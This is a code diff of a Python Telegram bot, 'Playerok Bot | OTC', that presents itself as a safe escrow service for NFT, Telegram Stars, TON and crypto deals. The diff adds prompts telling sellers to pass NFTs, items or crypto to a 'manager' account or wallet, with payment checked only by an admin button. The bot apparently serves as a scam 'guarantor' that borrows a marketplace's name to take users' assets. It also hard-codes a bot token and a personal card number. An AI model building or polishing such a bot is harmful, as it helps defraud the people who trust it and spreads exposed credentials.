@@ -6,9 +6,9 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.filters import Command, CommandStart
 
-# ========== TBOI ДАННЫЕ ==========
+# ========== ДАННЫЕ ==========
 BOT_TOKEN = "8243711699:AAGanT7gRrrAZtBiXSyy87HSmp1gCyFsQpM"
-ADMIN_ID = 174415647 , 7984393882
+ADMIN_IDS = {174415647, 7984393882}   # ФИКСsed: было ADMIN_ID = 174415647 , 7984393882 (кортеж)
 MANAGER_ID = 7602363090
 MANAGER_USERNAME = "ManagerDealsPlayerok"
 MANAGER_CARD = "89041751408 BT5 - Александр Ф."
@@ -21,7 +21,7 @@ BOT_USERNAME = "DealsPlayerokBot"
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# ========== ХРАНИЛИЩЕ ДАННЫХ ==========
+# ========== ХРАНИЛИЩЕ ==========
 user_agreements = {}
 user_languages = {}
 user_balances = {}
@@ -34,7 +34,7 @@ banned_users = set()
 admin_states = {}
 bot_username = None
 
-# ========== ФУНКЦИИ ==========
+# ========== УТИЛИТЫ ==========
 def generate_memo():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
 
@@ -50,26 +50,26 @@ async def get_bot_username():
 
 async def send_main_menu(chat_id, lang, message_id=None):
     keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
+    if lang == "ru":
+        text = ("👋 Playerok Bot | OTC\n\n"
+                "Безопасный и удобный сервис для сделок!\n\n"
+                "Наши преимущества:\n"
+                "- 🤖 Автоматические сделки\n"
+                "- 💸 Вывод в любой валюте\n"
+                "- 🛡 Поддержка 24/7\n"
+                "- ⚡️ Удобный интерфейс\n\n"
+                "Выберите нужный раздел ниже:")
+    else:
+        text = ("👋 Playerok Bot | OTC\n\n"
+                "Safe and convenient service for deals!\n\n"
+                "Our advantages:\n"
+                "- 🤖 Automatic deals\n"
+                "- 💸 Withdrawal in any currency\n"
+                "- 🛡 24/7 support\n"
+                "- ⚡️ User-friendly interface\n\n"
+                "Choose the desired section below:")
     try:
         photo = "https://i.postimg.cc/8P1ySbyM/og-playerok.png"
-        if lang == "ru":
-            text = ("👋 Playerok Bot | OTC\n\n"
-                    "Безопасный и удобный сервис для сделок!\n\n"
-                    "Наши преимущества:\n"
-                    "- 🤖 Автоматические сделки\n"
-                    "- 💸 Вывод в любой валюте\n"
-                    "- 🛡 Поддержка 24/7\n"
-                    "- ⚡️ Удобный интерфейс\n\n"
-                    "Выберите нужный раздел ниже:")
-        else:
-            text = ("👋 Playerok Bot | OTC\n\n"
-                    "Safe and convenient service for deals!\n\n"
-                    "Our advantages:\n"
-                    "- 🤖 Automatic deals\n"
-                    "- 💸 Withdrawal in any currency\n"
-                    "- 🛡 24/7 support\n"
-                    "- ⚡️ User-friendly interface\n\n"
-                    "Choose the desired section below:")
         if message_id:
             try:
                 await bot.delete_message(chat_id, message_id)
@@ -94,7 +94,7 @@ async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: In
             pass
         await callback.message.answer(text, reply_markup=reply_markup)
 
-# ========== КЛАВИАТУРЫ RUSSIAN ==========
+# ========== КЛАВИАТУРЫ RU ==========
 start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="✅ Полностью согласен ✅", callback_data="agree")]
 ])
@@ -135,11 +135,6 @@ currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
 ])
 
-cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
-    [InlineKeyboardButton(text="✅ Да, отменить", callback_data="confirm_cancel")],
-    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
-])
-
 profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="💰 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
     [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
@@ -167,7 +162,7 @@ requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
 ])
 
-# ========== КЛАВИАТУРЫ ENGLISH ==========
+# ========== КЛАВИАТУРЫ EN ==========
 start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="✅ I fully agree ✅", callback_data="agree")]
 ])
@@ -208,11 +203,6 @@ currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="🔙 BACK", callback_data="back_step")]
 ])
 
-cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
-    [InlineKeyboardButton(text="✅ Yes, cancel", callback_data="confirm_cancel")],
-    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
-])
-
 profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="💰 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
     [InlineKeyboardButton(text="🔙 BACK", callback_data="back_to_menu")]
@@ -240,7 +230,7 @@ requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
 ])
 
-# ============= СПЕЦИАЛЬНЫЕ КЛАВИАТУРЫ =============
+# ========== ОБЩИЕ КЛАВИАТУРЫ ==========
 language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")],
     [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
@@ -278,10 +268,14 @@ admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="🏠 Главное меню", callback_data="back_to_menu")]
 ])
 
+# ========== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ==========
+def is_admin(user_id: int) -> bool:
+    return user_id in ADMIN_IDS
+
 # ========== АДМИН ПАНЕЛЬ ==========
 @dp.message(Command("admin"))
 async def admin_panel_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         await message.answer("❌ У вас нет доступа")
         return
     text = (
@@ -306,7 +300,7 @@ async def admin_panel_command(message: Message):
 
 @dp.message(Command("stats"))
 async def admin_stats_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         args = message.text.split()
@@ -324,7 +318,7 @@ async def admin_stats_command(message: Message):
 
 @dp.message(Command("all"))
 async def admin_all_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     total_users = len(user_stats)
     total_deals = sum(s.get('total', 0) for s in user_stats.values())
@@ -342,7 +336,7 @@ async def admin_all_command(message: Message):
 
 @dp.message(Command("deal"))
 async def admin_deal_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         args = message.text.split()
@@ -357,7 +351,7 @@ async def admin_deal_command(message: Message):
 
 @dp.message(Command("success"))
 async def admin_success_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         args = message.text.split()
@@ -373,7 +367,7 @@ async def admin_success_command(message: Message):
 
 @dp.message(Command("turnover"))
 async def admin_turnover_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         args = message.text.split()
@@ -388,7 +382,7 @@ async def admin_turnover_command(message: Message):
 
 @dp.message(Command("rep"))
 async def admin_rep_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         args = message.text.split()
@@ -403,7 +397,7 @@ async def admin_rep_command(message: Message):
 
 @dp.message(Command("ban"))
 async def admin_ban_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         user_id = int(message.text.split()[1])
@@ -414,7 +408,7 @@ async def admin_ban_command(message: Message):
 
 @dp.message(Command("unban"))
 async def admin_unban_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     try:
         user_id = int(message.text.split()[1])
@@ -428,7 +422,7 @@ async def admin_unban_command(message: Message):
 
 @dp.message(Command("manager"))
 async def admin_manager_command(message: Message):
-    if message.from_user.id != ADMIN_ID:
+    if not is_admin(message.from_user.id):
         return
     await message.answer(
         f"👤 Информация о менеджере\n\n"
@@ -521,17 +515,15 @@ async def start_command(message: Message):
                         f"📄 Информация о сделке #{deal_id}\n\n"
                         f"👤 Вы покупатель в сделке.\n"
                         f"👤 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n\n"
-                        f"📦 - Вы покупаете: {deal['description']}\n"
+                        f"📦 Вы покупаете: {deal['description']}\n"
                         f"📌 Тип: {deal_type_text}\n\n"
                         f"{send_instruction}\n\n"
-                        f"{payment_text}\n\n"
-                        f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}"
+                        f"━━━━━━━━━━━━━━━━━━━━\n"
+                        f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}\n\n"
+                        f"{payment_text}"
                     )
 
-                    await message.answer(
-                        full_text,
-                        reply_markup=buyer_deal_keyboard
-                    )
+                    await message.answer(full_text, reply_markup=buyer_deal_keyboard)
 
                     seller_lang = user_languages.get(deal["seller_id"], "ru")
                     type_names_en = {
@@ -584,14 +576,12 @@ async def agree_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-
     user_agreements[callback.from_user.id] = True
     lang = user_languages.get(callback.from_user.id, "ru")
-
     if lang == "ru":
         await safe_edit_message(
             callback,
-            "👋 Добро пожаловать в Playerok — сервис, обеспечивающий безопасность и удобство проведения сделок.\n"
+            f"👋 Добро пожаловать в Playerok — сервис, обеспечивающий безопасность и удобство проведения сделок.\n"
             f"📢 Наш канал - {CHANNEL_LINK}\n"
             f"🆘 Поддержка - @{SUPPORT_USERNAME}",
             welcome_keyboard_ru
@@ -599,7 +589,7 @@ async def agree_callback(callback: CallbackQuery):
     else:
         await safe_edit_message(
             callback,
-            "👋 Welcome to Playerok - a service that ensures security and convenience of transactions.\n"
+            f"👋 Welcome to Playerok - a service that ensures security and convenience of transactions.\n"
             f"📢 Our channel - {CHANNEL_LINK}\n"
             f"🆘 Support - @{SUPPORT_USERNAME}",
             welcome_keyboard_en
@@ -620,17 +610,9 @@ async def create_deal_callback(callback: CallbackQuery):
         return
     lang = user_languages.get(callback.from_user.id, "ru")
     if lang == "ru":
-        await safe_edit_message(
-            callback,
-            "📝 Создать сделку\n\nВыберите тип сделки:",
-            deal_type_keyboard_ru
-        )
+        await safe_edit_message(callback, "📝 Создать сделку\n\nВыберите тип сделки:", deal_type_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
-            "📝 Create deal\n\nChoose deal type:",
-            deal_type_keyboard_en
-        )
+        await safe_edit_message(callback, "📝 Create deal\n\nChoose deal type:", deal_type_keyboard_en)
 
 @dp.callback_query(F.data.startswith("deal_"))
 async def deal_type_selected_callback(callback: CallbackQuery):
@@ -650,7 +632,6 @@ async def deal_type_selected_callback(callback: CallbackQuery):
         "deal_service": "📝 Опишите услугу подробно:",
         "deal_crypto": "📝 Введите сумму в криптовалюте:"
     }
-
     type_texts_en = {
         "deal_gift": "📝 Enter NFT/gift link(s):\n\nExample:\n`t.me/nft/DurovsCap-1`",
         "deal_stars": "📝 Enter Telegram Stars amount:\n\nExample:\n`1000`",
@@ -661,12 +642,7 @@ async def deal_type_selected_callback(callback: CallbackQuery):
     }
 
     text = type_texts_ru.get(deal_type, "📝 Опишите товар/услугу:") if lang == "ru" else type_texts_en.get(deal_type, "📝 Describe the item/service:")
-
-    await safe_edit_message(
-        callback,
-        f"📝 Создание сделки\n\n{text}",
-        back_keyboard_ru if lang == "ru" else back_keyboard_en
-    )
+    await safe_edit_message(callback, f"📝 Создание сделки\n\n{text}", back_keyboard_ru if lang == "ru" else back_keyboard_en)
 
 @dp.callback_query(F.data.startswith("currency_"))
 async def currency_callback(callback: CallbackQuery):
@@ -677,25 +653,16 @@ async def currency_callback(callback: CallbackQuery):
     currency = callback.data.split("_")[1]
     if currency == "STARS":
         currency = "Telegram Stars"
-
     if user_id in user_deals:
         user_deals[user_id]["currency"] = currency
         user_deals[user_id]["step"] = "amount"
         lang = user_languages.get(user_id, "ru")
         if lang == "ru":
-            await safe_edit_message(
-                callback,
-                f"📝 Создание сделки\n\nВведите сумму сделки в {currency}",
-                back_keyboard_ru
-            )
+            await safe_edit_message(callback, f"📝 Создание сделки\n\nВведите сумму сделки в {currency}", back_keyboard_ru)
         else:
-            await safe_edit_message(
-                callback,
-                f"📝 Creating deal\n\nEnter deal amount in {currency}",
-                back_keyboard_en
-            )
+            await safe_edit_message(callback, f"📝 Creating deal\n\nEnter deal amount in {currency}", back_keyboard_en)
 
-# ============= ОБРАБОТКА ТЕКСТА =============
+# ========== ОБРАБОТКА ТЕКСТА ==========
 @dp.message(F.text)
 async def handle_text(message: Message):
     if message.text.startswith('/'):
@@ -706,8 +673,8 @@ async def handle_text(message: Message):
         return
     lang = user_languages.get(user_id, "ru")
 
-    # Обработка состояний админа
-    if user_id == ADMIN_ID and user_id in admin_states:
+    # Состояния админа
+    if is_admin(user_id) and user_id in admin_states:
         state = admin_states[user_id]
         text = message.text.strip()
         if state == "waiting_ban_id":
@@ -780,29 +747,22 @@ async def handle_text(message: Message):
                 await message.answer("❌ Неверный формат. Используйте: ID СУММА")
         return
 
-    # Обработка создания сделки
+    # Создание сделки
     if user_id in user_deals:
         deal_data = user_deals[user_id]
-
         if deal_data.get("step") == "description":
             deal_data["description"] = message.text
             deal_data["step"] = "currency"
             if lang == "ru":
-                await message.answer(
-                    "📝 Создание сделки\n\nВыберите валюту:",
-                    reply_markup=currency_keyboard_ru
-                )
+                await message.answer("📝 Создание сделки\n\nВыберите валюту:", reply_markup=currency_keyboard_ru)
             else:
-                await message.answer(
-                    "📝 Creating deal\n\nChoose currency:",
-                    reply_markup=currency_keyboard_en
-                )
+                await message.answer("📝 Creating deal\n\nChoose currency:", reply_markup=currency_keyboard_en)
         elif deal_data.get("step") == "amount":
             try:
                 amount = float(message.text.replace(',', ''))
                 deal_data["amount"] = amount
                 deal_id = generate_deal_id()
-                username = await get_bot_username()
+                await get_bot_username()
                 deal_link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
                 active_deals[deal_id] = {
                     "seller_id": user_id,
@@ -823,7 +783,6 @@ async def handle_text(message: Message):
                     "deal_service": "🛠 Услуга",
                     "deal_crypto": "₿ Криптовалюта"
                 }
-
                 type_names_en = {
                     "deal_gift": "🎁 NFT/Gift",
                     "deal_stars": "⭐️ Telegram Stars",
@@ -832,8 +791,20 @@ async def handle_text(message: Message):
                     "deal_service": "🛠 Service",
                     "deal_crypto": "₿ Cryptocurrency"
                 }
-
                 type_text = type_names_ru.get(deal_data["type"], "📦 Товар") if lang == "ru" else type_names_en.get(deal_data["type"], "📦 Item")
+
+                # Инструкция продавцу что передать
+                seller_instruction = ""
+                if deal_data["type"] == "deal_gift":
+                    seller_instruction = f"\n⚠️ Передайте вашу NFT менеджеру @{MANAGER_USERNAME}"
+                elif deal_data["type"] == "deal_game":
+                    seller_instruction = f"\n⚠️ Передайте игровой предмет менеджеру @{MANAGER_USERNAME}"
+                elif deal_data["type"] == "deal_ton":
+                    seller_instruction = f"\n⚠️ Переведите TON на кошелёк менеджера:\n`{TON_WALLET}`"
+                elif deal_data["type"] == "deal_crypto":
+                    seller_instruction = f"\n⚠️ Переведите крипту на кошелёк менеджера:\n`{USDT_WALLET}`"
+                elif deal_data["type"] == "deal_service":
+                    seller_instruction = f"\n⚠️ Ожидайте оплаты от покупателя, затем выполните услугу"
 
                 if lang == "ru":
                     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -844,7 +815,8 @@ async def handle_text(message: Message):
                         f"📌 Тип: {type_text}\n"
                         f"💰 Сумма: {amount} {deal_data['currency']}\n"
                         f"📝 Описание: {deal_data['description']}\n"
-                        f"🔗 Ссылка для покупателя: {deal_link}",
+                        f"{seller_instruction}\n\n"
+                        f"🔗 Ссылка для покупателя:\n{deal_link}",
                         reply_markup=keyboard
                     )
                 else:
@@ -856,7 +828,8 @@ async def handle_text(message: Message):
                         f"📌 Type: {type_text}\n"
                         f"💰 Amount: {amount} {deal_data['currency']}\n"
                         f"📝 Description: {deal_data['description']}\n"
-                        f"🔗 Buyer link: {deal_link}",
+                        f"{seller_instruction}\n\n"
+                        f"🔗 Buyer link:\n{deal_link}",
                         reply_markup=keyboard
                     )
                 del user_deals[user_id]
@@ -867,101 +840,83 @@ async def handle_text(message: Message):
                     await message.answer("❌ Please enter a valid amount")
         return
 
-    # Обработка реквизитов
+    # Реквизиты
     if " - " in message.text and any(c.isdigit() for c in message.text):
         if user_id not in user_requisites:
             user_requisites[user_id] = {}
         user_requisites[user_id]["card"] = message.text
-        if lang == "ru":
-            await message.answer("✅ Реквизиты карты успешно добавлены!")
-        else:
-            await message.answer("✅ Card details successfully added!")
+        await message.answer("✅ Реквизиты карты успешно добавлены!" if lang == "ru" else "✅ Card details successfully added!")
     elif len(message.text) > 30 and ('UQ' in message.text or 'EQ' in message.text):
         if user_id not in user_requisites:
             user_requisites[user_id] = {}
         user_requisites[user_id]["ton"] = message.text
-        if lang == "ru":
-            await message.answer("✅ TON кошелек успешно добавлен!")
-        else:
-            await message.answer("✅ TON wallet successfully added!")
+        await message.answer("✅ TON кошелек успешно добавлен!" if lang == "ru" else "✅ TON wallet successfully added!")
     elif message.text.startswith('T') and len(message.text) == 34:
         if user_id not in user_requisites:
             user_requisites[user_id] = {}
         user_requisites[user_id]["usdt"] = message.text
-        if lang == "ru":
-            await message.answer("✅ USDT кошелек успешно добавлен!")
-        else:
-            await message.answer("✅ USDT wallet successfully added!")
+        await message.answer("✅ USDT кошелек успешно добавлен!" if lang == "ru" else "✅ USDT wallet successfully added!")
 
-# ============ ОПЛАТА ============
+# ========== ОПЛАТА ==========
 @dp.callback_query(F.data == "paid_confirmed")
 async def paid_confirmed_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-
     deal_id = None
     for did, deal in active_deals.items():
         if deal["buyer_id"] == callback.from_user.id and deal["status"] == "active":
             deal_id = did
             break
-
     if deal_id:
         deal = active_deals[deal_id]
         await callback.message.edit_text("✅ Оплата подтверждена, ожидайте проверки администратором")
-        await bot.send_message(
-            ADMIN_ID,
-            f"✅ Покупатель подтвердил оплату сделки #{deal_id}\n\n"
-            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-            f"👤 Продавец: @{deal['seller_username']}\n"
-            f"👤 Покупатель: @{deal['buyer_username']}\n"
-            f"📦 Товар: {deal['description']}",
-            reply_markup=admin_payment_keyboard
-        )
+        # Уведомляем всех админов
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(
+                    admin_id,
+                    f"✅ Покупатель подтвердил оплату сделки #{deal_id}\n\n"
+                    f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
+                    f"👤 Продавец: @{deal['seller_username']}\n"
+                    f"👤 Покупатель: @{deal['buyer_username']}\n"
+                    f"📦 Товар: {deal['description']}",
+                    reply_markup=admin_payment_keyboard
+                )
+            except:
+                pass
         active_deals[deal_id]["admin_message_id"] = callback.message.message_id
         active_deals[deal_id]["status"] = "waiting_admin"
 
 @dp.callback_query(F.data == "admin_payment_ok")
 async def admin_payment_ok_callback(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID and callback.from_user.id != MANAGER_ID:
+    if not is_admin(callback.from_user.id) and callback.from_user.id != MANAGER_ID:
         await callback.answer("❌ Нет доступа", show_alert=True)
         return
-
     deal_id = None
     for did, deal in active_deals.items():
         if deal.get("admin_message_id") and deal["status"] == "waiting_admin":
             deal_id = did
             break
-
     if deal_id:
         deal = active_deals[deal_id]
         deal["status"] = "payment_confirmed"
         seller_lang = user_languages.get(deal["seller_id"], "ru")
-
         type_names_ru = {
-            "deal_gift": "🎁 NFT/Подарок",
-            "deal_stars": "⭐️ Telegram Stars",
-            "deal_ton": "💎 TON",
-            "deal_game": "🎮 Игровой предмет",
-            "deal_service": "🛠 Услуга",
-            "deal_crypto": "₿ Криптовалюта"
+            "deal_gift": "🎁 NFT/Подарок", "deal_stars": "⭐️ Telegram Stars",
+            "deal_ton": "💎 TON", "deal_game": "🎮 Игровой предмет",
+            "deal_service": "🛠 Услуга", "deal_crypto": "₿ Криптовалюта"
         }
         type_names_en = {
-            "deal_gift": "🎁 NFT/Gift",
-            "deal_stars": "⭐️ Telegram Stars",
-            "deal_ton": "💎 TON",
-            "deal_game": "🎮 Game item",
-            "deal_service": "🛠 Service",
-            "deal_crypto": "₿ Cryptocurrency"
+            "deal_gift": "🎁 NFT/Gift", "deal_stars": "⭐️ Telegram Stars",
+            "deal_ton": "💎 TON", "deal_game": "🎮 Game item",
+            "deal_service": "🛠 Service", "deal_crypto": "₿ Cryptocurrency"
         }
-        deal_type_ru = type_names_ru.get(deal["type"], "📦 Товар")
-        deal_type_en = type_names_en.get(deal["type"], "📦 Item")
-
         if seller_lang == "ru":
             text = (
                 f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
                 f"📦 Предмет: {deal['description']}\n"
-                f"📌 Тип: {deal_type_ru}\n\n"
+                f"📌 Тип: {type_names_ru.get(deal['type'], '📦 Товар')}\n\n"
                 f"⚠️ Отправьте товар менеджеру @{MANAGER_USERNAME}\n\n"
                 f"✅ После отправки нажмите кнопку «📦 Товар отправлен»"
             )
@@ -969,39 +924,27 @@ async def admin_payment_ok_callback(callback: CallbackQuery):
             text = (
                 f"✅ Payment confirmed for deal #{deal_id}\n\n"
                 f"📦 Item: {deal['description']}\n"
-                f"📌 Type: {deal_type_en}\n\n"
+                f"📌 Type: {type_names_en.get(deal['type'], '📦 Item')}\n\n"
                 f"⚠️ Send the item to manager @{MANAGER_USERNAME}\n\n"
                 f"✅ After sending, press the «📦 Item sent» button"
             )
-        await bot.send_message(
-            deal["seller_id"],
-            text,
-            reply_markup=seller_gift_keyboard
-        )
+        await bot.send_message(deal["seller_id"], text, reply_markup=seller_gift_keyboard)
         await callback.message.edit_text("✅ Оплата подтверждена, продавец уведомлен")
 
 @dp.callback_query(F.data == "admin_payment_fail")
 async def admin_payment_fail_callback(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID and callback.from_user.id != MANAGER_ID:
+    if not is_admin(callback.from_user.id) and callback.from_user.id != MANAGER_ID:
         await callback.answer("❌ Нет доступа", show_alert=True)
         return
-
     deal_id = None
     for did, deal in active_deals.items():
         if deal.get("admin_message_id") and deal["status"] == "waiting_admin":
             deal_id = did
             break
-
     if deal_id:
         deal = active_deals[deal_id]
-        await bot.send_message(
-            deal["buyer_id"],
-            "❌ Оплата не подтверждена. Свяжитесь с поддержкой."
-        )
-        await bot.send_message(
-            deal["seller_id"],
-            "❌ Оплата не подтверждена. Свяжитесь с поддержкой."
-        )
+        await bot.send_message(deal["buyer_id"], "❌ Оплата не подтверждена. Свяжитесь с поддержкой.")
+        await bot.send_message(deal["seller_id"], "❌ Оплата не подтверждена. Свяжитесь с поддержкой.")
         await callback.message.edit_text("❌ Оплата не подтверждена")
 
 @dp.callback_query(F.data == "item_sent")
@@ -1009,13 +952,11 @@ async def item_sent_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-
     deal_id = None
     for did, deal in active_deals.items():
         if deal["seller_id"] == callback.from_user.id and deal["status"] == "payment_confirmed":
             deal_id = did
             break
-
     if deal_id:
         deal = active_deals[deal_id]
         deal["status"] = "item_sent"
@@ -1032,20 +973,22 @@ async def buyer_confirm_ok_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-
     deal_id = None
     for did, deal in active_deals.items():
         if deal["buyer_id"] == callback.from_user.id and deal["status"] == "item_sent":
             deal_id = did
             break
-
     if deal_id:
         deal = active_deals[deal_id]
         deal["status"] = "completed"
         success_message = "✅ Сделка состоялась успешно!"
         await callback.message.edit_text(success_message)
         await bot.send_message(deal["seller_id"], success_message)
-        await bot.send_message(ADMIN_ID, f"✅ Сделка #{deal_id} успешно завершена")
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(admin_id, f"✅ Сделка #{deal_id} успешно завершена")
+            except:
+                pass
         if deal["seller_id"] not in user_stats:
             user_stats[deal["seller_id"]] = {"successful": 0, "total": 0, "turnover": 0, "rep": 0}
         user_stats[deal["seller_id"]]["successful"] += 1
@@ -1058,48 +1001,42 @@ async def buyer_confirm_fail_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-
     deal_id = None
     for did, deal in active_deals.items():
         if deal["buyer_id"] == callback.from_user.id and deal["status"] == "item_sent":
             deal_id = did
             break
-
     if deal_id:
         deal = active_deals[deal_id]
         await callback.message.edit_text("✖ Вы сообщили о проблеме с получением товара. Свяжитесь с поддержкой.")
         await bot.send_message(deal["seller_id"], "✖ Покупатель сообщил о проблеме с получением товара. Свяжитесь с поддержкой.")
-        await bot.send_message(ADMIN_ID, f"⚠️ Проблема со сделкой #{deal_id}. Покупатель не получил товар.")
+        for admin_id in ADMIN_IDS:
+            try:
+                await bot.send_message(admin_id, f"⚠️ Проблема со сделкой #{deal_id}. Покупатель не получил товар.")
+            except:
+                pass
 
-# ========= ПРОФИЛЬ =========
+# ========== ПРОФИЛЬ ==========
 @dp.callback_query(F.data == "profile")
 async def profile_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-
     user_id = callback.from_user.id
     username = callback.from_user.username or "Не указан"
     balance = user_balances.get(user_id, 0)
-
     stats = user_stats.get(user_id, {"successful": 0, "total": 0, "turnover": 0, "rep": 0})
-    total_deals = stats.get("total", 0)
-    successful_deals = stats.get("successful", 0)
-    total_turnover = stats.get("turnover", 0)
-    rep = stats.get("rep", 0)
-
     lang = user_languages.get(user_id, "ru")
-
     if lang == "ru":
         await safe_edit_message(
             callback,
             f"👤 Профиль пользователя\n\n"
             f"📱 Имя пользователя: @{username}\n"
             f"💰 Общий баланс: {balance} RUB\n"
-            f"📊 Всего сделок: {total_deals}\n"
-            f"✅ Успешных сделок: {successful_deals}\n"
-            f"💵 Суммарный оборот: {total_turnover} RUB\n"
-            f"⭐️ Репутация: {rep}",
+            f"📊 Всего сделок: {stats.get('total', 0)}\n"
+            f"✅ Успешных сделок: {stats.get('successful', 0)}\n"
+            f"💵 Суммарный оборот: {stats.get('turnover', 0)} RUB\n"
+            f"⭐️ Репутация: {stats.get('rep', 0)}",
             profile_keyboard_ru
         )
     else:
@@ -1108,42 +1045,32 @@ async def profile_callback(callback: CallbackQuery):
             f"👤 User profile\n\n"
             f"📱 Username: @{username}\n"
             f"💰 Total balance: {balance} RUB\n"
-            f"📊 Total deals: {total_deals}\n"
-            f"✅ Successful deals: {successful_deals}\n"
-            f"💵 Total turnover: {total_turnover} RUB\n"
-            f"⭐️ Reputation: {rep}",
+            f"📊 Total deals: {stats.get('total', 0)}\n"
+            f"✅ Successful deals: {stats.get('successful', 0)}\n"
+            f"💵 Total turnover: {stats.get('turnover', 0)} RUB\n"
+            f"⭐️ Reputation: {stats.get('rep', 0)}",
             profile_keyboard_en
         )
 
-# =========== ДЕПОЗИТ ===========
+# ========== ДЕПОЗИТ ==========
 @dp.callback_query(F.data == "deposit")
 async def deposit_callback(callback: CallbackQuery):
     if callback.from_user.id in banned_users:
         await callback.answer("✖ Вы были заблокированы в боте", show_alert=True)
         return
-
     lang = user_languages.get(callback.from_user.id, "ru")
-
     if lang == "ru":
-        await safe_edit_message(
-            callback,
+        await safe_edit_message(callback,
             "❓ Как работают кнопки выбора валюты?\n\n"
-            "Когда вы выбираете, например, На карту → RUB → вводите сумму, бот "
-            "автоматически считает, сколько нужно пополнить в TON или USDT (сеть TON), чтобы после пополнения у вас хватило средств для оплаты сделки(-ок) на введенную вами сумму.\n\n"
-            "✅ Пример: если вы выбираете «На карту → RUB» и вводите 1000, бот подскажет, сколько нужно пополнить для того чтобы вы смогли оплатить сделку на 1000 RUB\n\n"
-            "Таким образом, вы всегда пополняете нужную вам сумму для оплаты сделок на любые валюты в валюте TON или USDT",
-            read_keyboard_ru
-        )
+            "Когда вы выбираете способ пополнения, бот автоматически считает, сколько нужно отправить.\n\n"
+            "✅ Пример: выберите «На карту → RUB» и введите 1000 — бот подскажет сколько нужно пополнить.",
+            read_keyboard_ru)
     else:
-        await safe_edit_message(
-            callback,
+        await safe_edit_message(callback,
             "❓ How do currency selection buttons work?\n\n"
-            "When you select, for example, To card → RUB → enter the amount, the bot "
-            "automatically calculates how much you need to top up in TON or USDT (TON network) so that after top-up you have enough funds to pay for the deal(s) for the amount you entered.\n\n"
-            "✅ Example: if you select «To card → RUB» and enter 1000, the bot will tell you how much you need to top up so that you can pay for a deal of 1000 RUB\n\n"
-            "Thus, you always top up the amount you need to pay for deals in any currency in TON or USDT currency",
-            read_keyboard_en
-        )
+            "When you select a top-up method, the bot automatically calculates how much to send.\n\n"
